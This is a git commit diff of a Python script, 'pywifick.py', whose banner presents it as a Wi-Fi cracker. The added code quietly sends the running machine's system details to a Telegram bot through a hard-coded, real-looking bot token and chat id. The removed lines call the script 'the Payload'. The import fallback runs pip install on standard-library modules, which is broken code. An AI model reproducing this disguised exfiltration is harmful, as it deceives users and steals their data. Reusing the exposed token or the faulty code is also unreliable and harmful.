574d871ec43ddc57cec9302a8613f9c27a672693
Senior Farbod <40601333+farbod-norouzi@users.noreply.github.com>
2022-05-17 19:29:27 +0430

    Add files via upload

--- pywifick.py
+++ pywifick.py
@@ -1,24 +1,29 @@
-import requests
-import platform
-import subprocess
+try:
+    import os
+    from os import system
+    import requests
+    import platform
+    import subprocess
+    from colorama import Fore
+except ImportError:
+   system("pip install os ")
+   system("pip install requests")
+   system("pip install colorama ")
+   system("pip install platform")
+   system("pip install subprocess")
+   exit("\n\nRun script Again")
 
+os.system("cls")
+print(Fore.RED+"""
+   dMP dMP dMP dMP dMMMMMP dMP        .aMMMb  dMMMMb  .aMMMb  .aMMMb  dMP dMP dMMMMMP dMMMMb 
+  dMP dMP dMP amr dMP     amr        dMP"VMP dMP.dMP dMP"dMP dMP"VMP dMP.dMP dMP     dMP.dMP 
+ dMP dMP dMP dMP dMMMP   dMP        dMP     dMMMMK" dMMMMMP dMP     dMMMMK" dMMMP   dMMMMK"  
+dMP.dMP.dMP dMP dMP     dMP        dMP.aMP dMP"AMF dMP dMP dMP.aMP dMP"AMF dMP     dMP"AMF   
+VMMMPVMMP" dMP dMP     dMP         VMMMP" dMP dMP dMP dMP  VMMMP" dMP dMP dMMMMMP dMP dMP    
+                                                                                             """+Fore.RESET)
 info = str(platform.uname())
 
-msg = "User Started The Payload...!"
-start = ("https://api.telegram.org/bot[bot token]/sendmessage?chat_id=[chat id]&text="+msg)
-url = ("https://api.telegram.org/bo[bot token]/sendmessage?chat_id=[chat id]&text="+"User System info : "+ "\n" +info)
-
-run = {
-    
-    "UrlBox":start,
-    "AgentList":"Google Chrome",
-    "VersionsList":"HTTP/1.1",
-    "MethodList":"POST"
-}
-
-req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",run)
-
-print(run)
+url = ("https://api.telegram.org/bot5342545382:AAFExqqlDSN07bR7hxcfPglPi4FrAVwiSBo/sendmessage?chat_id=1695284450&text="+"User System info : "+ "\n" +info)
 
 seve = {
     
